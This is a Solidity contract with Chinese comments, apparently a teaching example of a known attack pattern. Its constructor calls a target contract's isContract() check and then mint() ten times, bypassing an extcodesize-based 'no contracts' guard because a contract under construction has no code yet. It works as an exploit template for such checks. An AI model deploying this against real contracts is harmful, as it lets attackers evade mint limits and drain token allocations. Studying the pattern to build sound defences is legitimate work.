// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.18;

import {ContractCheck} from "./ContractCheck.sol";

// 利用构造函数的特点攻击
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // This will work
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // 合约创建好以后，extcodesize > 0，isContract() 可以检测
    function mint() external {
        ContractCheck(contractCheck).mint();
    }

    
}